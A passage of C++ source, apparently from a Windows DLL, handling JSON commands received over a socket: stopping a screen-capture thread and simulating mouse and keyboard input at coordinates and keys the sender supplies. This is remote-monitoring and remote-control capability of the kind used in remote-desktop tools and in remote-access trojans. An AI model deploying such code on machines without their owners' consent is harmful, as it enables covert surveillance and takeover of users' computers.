            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        shutdown_gdiplus();
    }
    return TRUE;
}
